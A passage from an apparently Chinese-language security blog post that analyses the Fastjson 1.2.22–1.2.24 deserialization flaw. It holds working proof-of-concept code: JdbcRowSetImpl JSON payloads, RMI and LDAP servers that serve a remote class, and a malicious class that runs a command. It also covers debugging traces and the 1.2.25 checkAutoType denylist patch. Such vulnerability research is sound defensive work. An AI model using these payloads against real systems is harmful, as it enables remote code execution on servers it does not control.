class="string">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure><p>JNDIServer.java，RMI服务，注册表绑定了Exploit服务，该服务是指向恶意Exploit.class文件所在服务器的Reference：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//http://127.0.0.1:8000/Exploit.class即可</span></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exloit"</span>,</span><br><span class="line">                <span class="string">"Exploit"</span>,<span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"Exploit"</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit.java，恶意类，单独编译成class文件并放置于RMI服务指向的三方Web服务中，作为一个Factory绑定在注册表服务中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmds = System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"win"</span>)</span><br><span class="line">                    ? <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>,<span class="string">"/c"</span>, <span class="string">"calc.exe"</span>&#125;</span><br><span class="line">                    : <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>, <span class="string">"touch /tmp/hacked"</span>&#125;;</span><br><span class="line">            Runtime.getRuntime().exec(cmds);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JdbcRowSetImplPoc.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先运行JNDI的RMI服务，将恶意类Exploit.class单独放置于一个三方的Web服务中，然后运行PoC即可弹计算器，且看到访问了含有恶意类的Web服务：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/25.png" alt=""></p><h4 id="JNDI-LDAP复现利用"><a href="#JNDI-LDAP复现利用" class="headerlink" title="JNDI+LDAP复现利用"></a>JNDI+LDAP复现利用</h4><p>PoC如下，跟RMI的相比只是改了URL而已：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>但是相比RMI的利用方式，优势在于JDK的限制更低了。</p><p>LdapServer.java，区别在于将之前的RMI服务端换成LDAP服务端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8000/#Exploit"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit.java不变。</p><p>JdbcRowSetImplPoC.java中修改payload中的dataSourceName的值为指向LDAP服务端地址即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125;"</span>;</span><br></pre></td></tr></table></figure><p>和RMI同样的利用方式，能成功弹计算器：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/26.png" alt=""></p><h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p>虽然前面两个复现利用是用的不同的服务，但是都是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来触发的，漏洞点都是JNDI注入导致的。</p><p>在<code>JSON.parse(payload);</code>处打下断点开始往下调试。</p><p>前面的函数调用过程和基于TemplateImpl的调试分析几乎是一样的，只看下区别的地方。</p><p>调用scanSymbol()函数扫描到com.sun.rowset.JdbcRowSetImpl类后，再调用TypeUtils.loadClass()函数将该类加载进来：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/27.png" alt=""></p><p>往下调试，调用了FastjsonASMDeserializer.deserialze()函数对该类进行反序列化操作：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/28.png" alt=""></p><p>继续往下调试，就是ASM机制生成的临时代码了，这些代码是下不了断点、也看不到，直接继续往下调试即可。</p><p>由于PoC设置了dataSourceName键值和autoCommit键值，因此在JdbcRowSetImpl中的setDataSourceName()和setAutoCommit()函数都会被调用，因为它们均满足前面说到的Fastjson在反序列化时会自动调用的setter方法的特征。</p><p>先是调试到了setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/29.png" alt=""></p><p>接着调用到setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/30.png" alt=""></p><p>跟进connect()函数，看到了熟悉的JNDI注入的代码即<code>InitialContext.lookup()</code>，并且其参数是调用<code>this.getDataSourceName()</code>获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/31.png" alt=""></p><p>再往下就是JNDI注入的调用过程了，最后是成功利用JNDI注入触发Fastjson反序列化漏洞、达到任意命令执行效果。</p><p>调试过程的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">connect:654, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4081, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:606, Method (java.lang.reflect)</span><br><span class="line">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">main:6, JdbcRowSetImplPoc</span><br></pre></td></tr></table></figure><h4 id="一个小问题"><a href="#一个小问题" class="headerlink" title="一个小问题"></a>一个小问题</h4><p>这里漏洞触发点是<code>JSON.parse(payload);</code>，改成用<code>JSON.parse(payload);</code>也是可以成功利用的。</p><p>为啥会这样呢？其实看到之前讲解的parse与parseObject区别就知道了。</p><p>我们将JSON.parse()换成JSON.parseObject()再调试一遍会发现，JSON.parseObject()会调用到JSON.parse()、再调用DefaultJSONParser.parse()，也就是说JSON.parseObject()本质上还是调用JSON.parse()进行反序列化的，区别不过是parseObject()会额外调用JSON.toJSON()来将Java对象专为JSONObject对象。两者的反序列化的操作时一样的，因此都能成功触发。</p><h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><p>这里下载1.2.25版本的jar包看下是怎么修补的。</p><h3 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType()"></a>checkAutoType()</h3><p>修补方案就是将DefaultJSONParser.parseObject()函数中的<code>TypeUtils.loadClass</code>替换为checkAutoType()函数：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/33.png" alt=""></p><p>看下checkAutoType()函数，具体的可看注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// autoTypeSupport默认为False</span></span><br><span class="line">    <span class="comment">// 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            String accept = acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            String deny = denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从Map缓存中获取类，注意这是后面版本的漏洞点</span></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            String deny = denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            String accept = acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">            || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">           ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单地说，checkAutoType()函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。</p><p>默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。</p><p>denyList黑名单中列出了常见的反序列化漏洞利用链Gadgets：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>这里可以看到黑名单中包含了”com.sun.”，这就把我们前面的几个利用链都给过滤了，成功防御了。</p><p>运行能看到报错信息，说autoType不支持该类：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/32.png" alt=""></p><p>调试分析看到，就是在checkAutoType()函数中未开启autoTypeSupport即默认设置的场景下被黑名单过滤了从而导致抛出异常程序终止的：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/34.png" alt=""></p><h3 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" 